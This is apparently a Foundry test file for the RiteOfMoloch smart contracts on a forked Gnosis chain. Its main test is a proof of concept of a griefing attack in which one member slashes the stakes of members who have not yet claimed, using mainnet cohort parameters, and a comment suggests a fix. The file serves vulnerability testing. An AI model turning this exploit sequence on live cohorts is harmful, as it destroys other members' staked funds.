// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/RiteOfMoloch.sol";
import "../src/RiteOfMolochFactory.sol";
import "../src/InitializationData.sol";

import "./mocks/mockRaid.sol";
import "./mocks/MolochStooge.sol";


    // @parseb
    /// @notice (gnosis fork) testing
contract RiteOfMolochTest is Test, InitializationData {

    address ADMIN = address(bytes20("ADMIN"));
    address OPERATOR = address(bytes20("OPERATOR"));
    address MEMBER = address(bytes20("MEMBER"));
    address raidWhale = address(bytes20("HAS_MAX_RAID"));
    
    RiteOfMolochFactory riteFactory;
    RiteOfMoloch riteOfMoloch;
    MockRaid raidToken;
    MolochDAO Moloch;
    MolochStooge fakeMoloch;

    InitData InitD;
    address s3DaoAddress = 0x7BdE8f8A3D59b42d0d8fab3a46E9f42E8e3c2dE8;


    function setUp() public {
        vm.createSelectFork(vm.envString("gnosis_rpc"), 19181791);

        vm.startPrank(ADMIN);
        riteFactory = new RiteOfMolochFactory();
        raidToken = new MockRaid();

        //moloch = MolochDAO(s3DaoAddress);
        fakeMoloch = new MolochStooge();

        raidToken.transfer(raidWhale, raidToken.balanceOf(ADMIN));
        vm.stopPrank();
        vm.startPrank(raidWhale);
        uint amt = type(uint256).max / 20;
        raidToken.transfer(ADMIN, amt);
        raidToken.transfer(OPERATOR, amt);
        raidToken.transfer(MEMBER, amt);
        vm.stopPrank();
        

    }


    function newRite(
        address m1,
        address s2,
        address t3,
        uint t4, 
        uint a5,
        uint d6
    ) public returns( RiteOfMoloch ) {
        InitD = InitData(m1,s2,t3, t4, a5,d6, "Name", "Symbol", "baseUri");
        uint lastID = riteFactory.iid();
        riteOfMoloch = RiteOfMoloch( riteFactory.createCohort(InitD, lastID));
    }


    // function testZeroValues2() public {
    //     /// forks gnosis moloch

    //     //////// Instance 2 :  1 1 0 0 1 1 - - -

    //     address raidTokenAddress = address(raidToken);

    //     vm.startPrank(raidWhale, raidWhale);
    //     InitD = InitData(s3DaoAddress, raidTokenAddress, address(55),0,1,1,"name","symbol","uri");  
    //     address at = riteFactory.createCohort(InitD, 1);
    //     console.log(at);
    //     riteOfMoloch = RiteOfMoloch(at);

    //     vm.expectRevert("ERC20: insufficient allowance");
    //     riteOfMoloch.joinInitiation(address(32423523));

    //     address joined = address(1337);
    //     raidToken.transfer(joined, raidToken.balanceOf(raidWhale)/3);
    //     vm.stopPrank();

    //     uint prevJoinsBalance = raidToken.balanceOf(joined);
    //     assertTrue(prevJoinsBalance > 1, "balance is 01");
        
    //     vm.startPrank(address(joined),address(joined));
    //     raidToken.approve(address(riteOfMoloch), type(uint).max);
        
    //     uint prevWhaleBalance = raidToken.balanceOf(joined);
    //     riteOfMoloch.joinInitiation(joined);

    //     assertTrue(riteOfMoloch.isMember(joined), "joined but not member");
    //     assertTrue( prevJoinsBalance  > raidToken.balanceOf(joined), "blance error here");

    //     /// @note random address (any) is member when InitData.threshold is 0;
    //     assertTrue(riteOfMoloch.minimumStake() == 1, "min stake not 1");
    //     address rando_ = address(453534436254347);
    //     assertTrue(riteOfMoloch.isMember(rando_), "rando ! member");
    //     // rando_ = address(0);
    //     // assertTrue(riteOfMoloch.isMember(rando_), "rando ! member");

   
    // }    


    function testInitiateGriefingAttack() public {

        /// Thesis
        /// A member can slash fellow members that have not yet claimed their stake back
        /// this opens up a race condition  / griefing attack
        /// no gain only pain

        /// actors
        address hasClainedUngriefable = address(bytes20(keccak256("hasClaimedUngriefable")));
        address hasNotClaimedGriefable = address(bytes20(keccak256("hasNotClaimedGriefable")));
        address hackermansCohortMember = address(bytes20(keccak256("hackermansCohortMember")));

        /// mainnet cohort initialization params (https://blockscout.com/xdai/mainnet/tx/0xe8123d8b9b4e563bcd1bc8e91f48f6a43087edb787ad96fdd2af693037e7638a)

        // address moloch = 0xfe1084bC16427e5EB7f13Fc19bCD4E641F7d571f;
        address moloch = address(fakeMoloch);
        address implementation = 0x4589b0760baD5fAfBdAD8f3e8227991e8Ee99160;
        address stakingAsset = 0x18E9262e68Cc6c6004dB93105cc7c001BB103e49;
        //address stakingAsset = 0xf8D1677c8a0c961938bf2f9aDc3F3CFDA759A9d9;
        address treasury = implementation;
        uint threashold = 100;
        uint assetAmount = 5000000000000000000000;
        uint maxTime = 15780000;

        address realRaidWhale =  0x187089B33E5812310Ed32A57F53B3fAD0383a19D;
        //raidWhale = realRaidWhale;
        //raidToken = MockRaid(stakingAsset); // ERC20
        address raidTokenAddress = address(raidToken);

        /// fund actors
        vm.startPrank(raidWhale, raidWhale);
        raidToken.transfer(hasClainedUngriefable, assetAmount);
        raidToken.transfer(hasNotClaimedGriefable, assetAmount); 
        raidToken.transfer(hackermansCohortMember, assetAmount); 
        vm.stopPrank();


        InitD = InitData(moloch, raidTokenAddress, moloch, threashold, assetAmount, maxTime, "Rite of Moloch - Cohort V", "ROM", "https://ipfs.io/ipfs/Qmd286K6pohQcTKYqnS1YhWrCiS4gz7Xi34sdwMe9USZ7u");  
        address at = riteFactory.createCohort(InitD, 1);
        console.log(at);
        riteOfMoloch = RiteOfMoloch(at);

    
        /// 3 join initiation pack
        vm.prank(hasClainedUngriefable,hasClainedUngriefable);
        raidToken.approve(address(riteOfMoloch), type(uint).max);
        vm.prank(hasClainedUngriefable,hasClainedUngriefable);
        riteOfMoloch.joinInitiation(hasClainedUngriefable);
        assertTrue(riteOfMoloch.isMember(hasClainedUngriefable)); //fake

        skip(100);

        vm.prank(hasNotClaimedGriefable,hasNotClaimedGriefable);
        raidToken.approve(address(riteOfMoloch), type(uint).max);
        vm.prank(hasNotClaimedGriefable,hasNotClaimedGriefable);
        riteOfMoloch.joinInitiation(hasNotClaimedGriefable); 
        assertTrue( riteOfMoloch.isMember(hasNotClaimedGriefable)); //fake
/////////////////////////


        skip(100);

        vm.prank(hackermansCohortMember,hackermansCohortMember);
        raidToken.approve(address(riteOfMoloch), type(uint).max);
        vm.prank(hackermansCohortMember,hackermansCohortMember);
        riteOfMoloch.joinInitiation(hackermansCohortMember);
        assertTrue( riteOfMoloch.isMember(hackermansCohortMember)); //fake
        ///
        
        skip(maxTime + 1);

        /// member slashes member that has not claimed yet <---- 'big trouble'
        address[] memory lambs = new address[](3);
        lambs[0] = hasClainedUngriefable;
        lambs[1] = hasNotClaimedGriefable;

        /// hackermaans has 0 slashed balance
        assertTrue(riteOfMoloch.totalSlash(hackermansCohortMember) == 0, "script kiddie already hackermans");
        
        vm.prank(hackermansCohortMember);
        riteOfMoloch.sacrifice(lambs);

        {
        /// hackermaans has 1+ slashed balance
        assertTrue(riteOfMoloch.totalSlash(hackermansCohortMember) > 0, "true hackermans");
        
        /// check if still initiate
        assertTrue(riteOfMoloch.deadlines(lambs[0]) == 0, "not slashed");
        assertTrue(riteOfMoloch.deadlines(lambs[1]) == 0, "not slashed");
        }
        
        /// Potential Solution:
        // If member continue ! do not slash
    }


}